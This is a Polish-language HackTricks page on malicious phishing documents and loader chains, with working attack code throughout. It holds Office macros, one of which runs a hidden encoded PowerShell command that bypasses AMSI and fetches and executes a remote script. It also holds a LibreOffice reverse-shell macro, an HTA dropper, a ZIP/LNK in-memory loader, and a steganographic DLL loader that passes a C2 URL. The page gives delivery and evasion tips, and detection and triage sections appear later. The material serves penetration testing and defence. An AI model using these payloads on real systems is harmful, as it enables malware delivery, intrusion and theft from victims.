# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word przeprowadza walidację danych pliku przed jego otwarciem. Walidacja danych polega na identyfikacji struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra mają rozszerzenie `.docm`. Można jednak zmienić nazwę pliku, modyfikując jego rozszerzenie, a mimo to zachować możliwość wykonywania makr.\
Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM ze zmienionym rozszerzeniem na RTF zostanie obsłużony przez Microsoft Word i będzie mógł wykonywać makra.\
Te same mechanizmy i zasady działania dotyczą wszystkich programów pakietu Microsoft Office (Excel, PowerPoint itd.).

Możesz użyć poniższego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:

```bash
assoc | findstr /i "word excel powerp"
```

Pliki DOCX odwołujące się do zdalnego szablonu (Plik – Opcje – Dodatki – Zarządzaj: Szablony – Przejdź), który zawiera makra, również mogą „uruchamiać” makra.

### Ładowanie zewnętrznego obrazu

Przejdź do: _Wstawianie --> Szybkie części --> Pole_\
_**Kategorie**: Łącza i odwołania, **Nazwy pól**: includePicture, i **Nazwa pliku lub adres URL:**_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor w makrach

Makra mogą służyć do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje autoload

Im są powszechniejsze, tym większe prawdopodobieństwo, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Przykłady kodu makr

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, aby otworzyć Inspektora dokumentów. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz listę rozwijaną **Save as type** i zmień format z **`.docx`** na Word 97-2003 **`.doc`**.\
Zrób to, ponieważ **nie można zapisywać makr w pliku `.docx`**, a rozszerzenie obsługujące makra **`.docm`** ma **złą reputację** (np. ikona miniatury ma duży znak `!`, a niektóre bramy internetowe/pocztowe całkowicie blokują takie pliki). Dlatego starsze rozszerzenie **`.doc`** to najlepszy kompromis.

#### Generatory złośliwych makr

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Makra automatycznie uruchamiane w dokumentach ODT LibreOffice (Basic)

Dokumenty LibreOffice Writer mogą zawierać makra Basic, które są automatycznie wykonywane po otwarciu pliku, jeśli makro zostanie powiązane ze zdarzeniem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Proste makro reverse shell wygląda tak:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz ciągu znaków — LibreOffice Basic używa ich do escapowania cudzysłowów literalnych, więc payloady kończące się na `...==""")` zachowują poprawne sparowanie zarówno wewnętrznego polecenia, jak i argumentu Shell.

Wskazówki dotyczące dostarczania:

- Zapisz plik jako `.odt` i przypisz makro do zdarzenia dokumentu, aby uruchamiało się natychmiast po otwarciu.
- Wysyłając e-mail za pomocą `swaks`, użyj `--attach @resume.odt` (`@` jest wymagane, aby załącznikiem były bajty pliku, a nie ciąg znaków z nazwą pliku). Jest to kluczowe przy nadużywaniu serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez weryfikacji.

## Pliki HTA

HTA to program systemu Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i działa jako aplikacja „w pełni zaufana”, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA uruchamia się za pomocą **`mshta.exe`**, który jest zwykle **instalowany** razem z **Internet Explorerem**, co oznacza, że **`mshta` zależy od IE**. Jeśli więc IE został odinstalowany, HTA nie będzie można uruchomić.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów na **zdalne wymuszenie uwierzytelniania NTLM** — można na przykład dodać **niewidoczne obrazy** do e-maili lub kodu HTML, który użytkownik odwiedzi (nawet przez HTTP MitM?). Można też wysłać ofierze **adres plików**, które **wyzwolą** **uwierzytelnianie** już przy **otwarciu folderu**.

**Więcej pomysłów i metod znajdziesz na następujących stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że możesz nie tylko wykraść hash lub dane uwierzytelniające, ale także **przeprowadzić ataki NTLM relay**:

- [**Ataki NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + payloady osadzone w ZIP (fileless chain)

Wysoce skuteczne kampanie dostarczają plik ZIP zawierający dwa wiarygodne dokumenty-przynęty (PDF/DOCX) oraz złośliwy plik .lnk. Sztuczka polega na tym, że właściwy PowerShell loader jest zapisany w surowych bajtach pliku ZIP za unikalnym znacznikiem, a plik .lnk wycina go i uruchamia w całości w pamięci.<sup>[[2]](#references)</sup>

Typowy przebieg działania one-linera PowerShell w pliku .lnk:

1) Znajdź oryginalny plik ZIP w typowych lokalizacjach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalog nadrzędny bieżącego katalogu roboczego.
2) Odczytaj bajty pliku ZIP i znajdź zakodowany na stałe znacznik (np. xFIQCV). Wszystko, co znajduje się za znacznikiem, to osadzony payload PowerShell.
3) Skopiuj plik ZIP do %ProgramData%, rozpakuj go tam i otwórz przynętę .docx, aby plik wyglądał wiarygodnie.
4) Omiń AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Usuń obfuskację z kolejnego etapu (np. usuń wszystkie znaki #) i wykonaj go w pamięci.

Przykładowy szkielet PowerShell do wycięcia i uruchomienia osadzonego etapu:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notatki
- Dostarczanie często wykorzystuje subdomeny renomowanych platform PaaS (np. *.herokuapp.com) i może uzależniać udostępnienie payloadu od warunków (np. serwować nieszkodliwe pliki ZIP na podstawie adresu IP/UA).
- Kolejny etap często odszyfrowuje shellcode zakodowany w base64/XOR i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby ograniczyć ślady na dysku.

Utrwalanie w tym samym łańcuchu
- Przejęcie COM TypeLib kontrolki Microsoft Web Browser, dzięki czemu IE/Explorer lub dowolna aplikacja ją osadzająca automatycznie ponownie uruchamia payload.<sup>[[2]](#references)[[4]](#references)</sup> Szczegóły i gotowe do użycia polecenia znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Polowanie/IOC
- Pliki ZIP zawierające dopisany do danych archiwum ciąg znaków ASCII (np. xFIQCV).
- Plik .lnk, który przeszukuje foldery nadrzędne/użytkownika, aby znaleźć plik ZIP, i otwiera dokument-wabik.
- Manipulowanie AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długie wątki dotyczące spraw biznesowych, kończące się linkami hostowanymi w zaufanych domenach PaaS.

## Etapowanie z wabikiem LNK na pierwszym planie → utrwalanie przez zaplanowane zadanie → side-loading zaufanego CPL

Kolejnym powtarzającym się wzorcem jest **plik `.lnk` podszywający się pod dokument**, który od razu otwiera nieszkodliwy wabik, a jednocześnie w tle przygotowuje właściwy łańcuch działań.<sup>[[3]](#references)</sup>

Zaobserwowany przebieg:
1. Skrót **podszywa się pod plik PDF** i używa `conhost.exe` lub podobnego procesu-proxy do uruchomienia zaciemnionego downloadgera PowerShell.
2. PowerShell rozdziela oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), przez co proste mechanizmy wykrywania szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie rozpoznają polecenia.
3. Stager najpierw pobiera **dokument-wabik**, otwiera go dla ofiary, a następnie w tle odtwarza złośliwe pliki.
4. Payloady mogą być zapisywane z **nietypowymi rozszerzeniami**, a następnie przemianowywane przez usunięcie znaków-wypełniaczy, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Utrwalanie jest zapewniane przez **zaplanowane zadanie uruchamiane co minutę**, które uruchamia zaufany plik binarny hosta ze ścieżki, w której użytkownik może zapisywać pliki.

Podstawowe wskazówki do polowania na ten wzorzec:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Przydatny układ plików stagingowych, który warto rozpoznawać:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` lub `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Dlaczego drugi etap jest stealthy

W case study Rapid7 zaplanowane zadanie wielokrotnie uruchamiało **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ obok niego umieszczono **`APPWIZ.cpl`**, który eksportował **`RunFODW`**, zaufany plik binarny Microsoftu ładował attacker CPL zamiast jego legalnej kopii systemowej.

Następnie CPL:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go za pomocą **Windows CNG / `bcrypt.dll`**
- Przydziela pamięć wykonywalną i kopiuje do niej odszyfrowany shellcode
- Uruchamia go pośrednio, przekazując wskaźnik do shellcode jako callback dla **`EnumUILanguagesW`**

Ten ostatni krok warto sprawdzać osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legalnej funkcji WinAPI przyjmującej callback**, aby przekazać sterowanie.

Odszyfrowanym payloadem w tej kampanii był shellcode **Donut**, który następnie mapował końcowy PE w całości w pamięci i patchował **AMSI/WLDP/ETW** w bieżącym procesie przed przekazaniem mu sterowania. Więcej informacji o side-loadingu i post-processingu w pamięci znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne punkty do sprawdzenia:
- `.lnk` uruchamiający `powershell.exe` lub `conhost.exe`, po czym wyświetlany jest dokument-przynęta.
- Krótkotrwałe pobrania do **`C:\Users\Public\`**, po których natychmiast zmieniane są nazwy plików o nietypowych rozszerzeniach.
- Zaplanowane zadania o neutralnych nazwach, takich jak `GoogleErrorReport`, uruchamiane z **katalogów zapisywalnych przez użytkownika**.
- Zaufane pliki binarne ładujące pliki **`.cpl` / `.dll`** z tego samego katalogu spoza systemu.
- Bloby tekstowe Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez moduł załadowany przez side-loading.

## Payloady w obrazach z delimitatorami steganograficznymi (PowerShell stager)

Najnowsze łańcuchy loaderów dostarczają zaciemniony skrypt JavaScript/VBS, który dekoduje i uruchamia PowerShell stager Base64. Ten stager pobiera obraz (często GIF) zawierający zakodowaną w Base64 bibliotekę DLL .NET ukrytą w postaci zwykłego tekstu między unikatowymi znacznikami początku i końca. Skrypt wyszukuje te delimitery (przykłady zaobserwowane w praktyce: «<<sudo_png>> … <<sudo_odt>>>»), wyodrębnia tekst między nimi, dekoduje go z Base64 do bajtów, ładuje zestaw w pamięci i wywołuje znaną metodę wejściową, przekazując jej URL C2.<sup>[[5]](#references)</sup>

Przebieg działania
- Etap 1: Archiwizowany dropper JS/VBS → dekoduje osadzony ciąg Base64 → uruchamia PowerShell stager z parametrami -nop -w hidden -ep bypass.
- Etap 2: PowerShell stager → pobiera obraz, wyodrębnia Base64 ograniczone znacznikami, ładuje bibliotekę DLL .NET w pamięci i wywołuje jej metodę (np. VAI), przekazując URL C2 oraz opcje.
- Etap 3: Loader pobiera końcowy payload i zazwyczaj wstrzykuje go przez process hollowing do zaufanego pliku binarnego (często MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Więcej informacji o process hollowing i wykonywaniu kodu za pośrednictwem zaufanych narzędzi znajdziesz tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell wyodrębniający bibliotekę DLL z obrazu i wywołujący metodę .NET w pamięci:

<details>
<summary>Ekstraktor steganograficznego payloadu i loader w PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Uwagi
- To ATT&CK T1027.003 (steganografia/ukrywanie markerów).<sup>[[6]](#references)</sup> Markery różnią się między kampaniami.
- AMSI/ETW bypass i deobfuskacja ciągów znaków są zwykle stosowane przed załadowaniem assembly.
- Wykrywanie: skanuj pobrane obrazy w poszukiwaniu znanych separatorów; identyfikuj przypadki, w których PowerShell uzyskuje dostęp do obrazów i natychmiast dekoduje osadzone ciągi Base64.

Zobacz także narzędzia stego i techniki carvingu:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → etapowanie PowerShell przez Base64

Powtarzającym się początkowym etapem jest niewielki, silnie zaciemniony plik `.js` lub `.vbs` dostarczany w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z opcjami `-nop -w hidden -ep bypass`, aby pobrać kolejny etap przez HTTPS.<sup>[[5]](#references)</sup>

Szkielet logiki (abstrakcyjny):
- Odczytaj zawartość własnego pliku
- Znajdź blob Base64 między ciągami śmieciowymi
- Zdekoduj do postaci skryptu PowerShell w ASCII
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, uruchamiając `powershell.exe`

Wskazówki dotyczące wykrywania
- Załączniki JS/VBS z archiwów uruchamiające `powershell.exe`, z `-enc`/`FromBase64String` w wierszu poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Dokumenty MSC jako kontenery wykonawcze (GrimResource)

Pliki Microsoft Management Console (`.msc`) to definicje konsoli w formacie XML, zwykle otwierane przez `mmc.exe`. **GrimResource** wykorzystuje odwołanie `StringTable` do zasobu `apds.dll` zawierającego stary mechanizm XSS, dzięki czemu otwarcie spreparowanej konsoli przez użytkownika powoduje uruchomienie JavaScriptu wewnątrz `mmc.exe`. Zaobserwowane próbki łączyły zaciemnianie oparte na `transformNode` z **DotNetToJScript**, aby utworzyć payload .NET bez typowej ścieżki makr Office.<sup>[[9]](#references)</sup>

Podczas wstępnej analizy statycznej traktuj niezaufany plik MSC jako tekst i **nie klikaj go dwukrotnie**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Punkty kontrolne o wysokiej wartości podczas analizy działania to sytuacje, w których `mmc.exe` ładuje CLR lub komponenty skryptowe, nawiązuje połączenia sieciowe albo uruchamia `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` lub nieoczekiwany plik wykonywalny. Ten format jest legalny, dlatego detekcje powinny korelować **źródło + podejrzaną zawartość XML/skryptu + zachowanie `mmc.exe`**, zamiast blokować wszystkie pliki MSC.<sup>[[9]](#references)</sup>

## Przekierowania PDF/QR i bramkowanie payloadu

PDF nie wymaga exploita, by być użyteczny. W niedawnych kampaniach w dokumentach wyglądających na nieszkodliwe umieszczano **kod QR lub zwykły link**, przenoszono sesję przeglądarki poza kontrolę poczty i personalizowano stronę docelową adresem odbiorcy. Microsoft udokumentował w 2025 r. pliki PDF z adresami URL kodów QR unikalnymi dla odbiorców, które prowadziły do infrastruktury kradnącej dane logowania RaccoonO365; w równoległym łańcuchu, dzięki filtrowaniu według adresu IP/środowiska, wybranym użytkownikom zwracano ścieżkę JavaScript/MSI, a skanerom lub niedozwolonym klientom — nieszkodliwy plik PDF.<sup>[[10]](#references)</sup>

Analizuj zarówno akcje PDF, jak i wyrenderowane kody QR. Kod QR może być narysowany wektorowo, a nie zapisany jako możliwy do wyodrębnienia obraz, dlatego rasteryzuj każdą stronę oraz wyodrębniaj osadzone obrazy:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Sprawdzaj zdekodowane adresy docelowe i przekierowania z odizolowanego systemu analitycznego, bez uwierzytelniania. Przydatne cechy do wyszukiwania to pliki PDF zawierające wyłącznie kody QR i niemal puste treści wiadomości e-mail, adres e-mail odbiorcy osadzony w parametrze zapytania, kilka przekierowań przez renomowane usługi hostingowe oraz różna zawartość zwracana zależnie od adresu IP, geolokalizacji, cookies, referrera lub user agenta. Porównuj żądania przy użyciu kontrolowanych profili, ponieważ pojedyncze pobranie w sandboxie może zwrócić tylko przynętę.<sup>[[10]](#references)</sup>

## Pliki Windows służące do kradzieży hashy NTLM

Sprawdź stronę o **miejscach, z których można ukraść dane logowania NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Makro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampania ZipLine: wyrafinowany atak phishingowy wymierzony w amerykańskie firmy](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: śledzenie technik Dropping Elephant w łańcuchu loaderów nawiązujących do Chin](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Przejęcie TypeLib – nowa technika utrwalania COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Loader PhantomVAI dostarcza różne rodzaje infostealerów](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Wykorzystanie zaufanych narzędzi deweloperskich do proxy execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console do uzyskania początkowego dostępu i unikania wykrycia](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Aktorzy zagrożeń wykorzystują sezon rozliczeń podatkowych do prowadzenia kampanii phishingowych o tematyce podatkowej](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
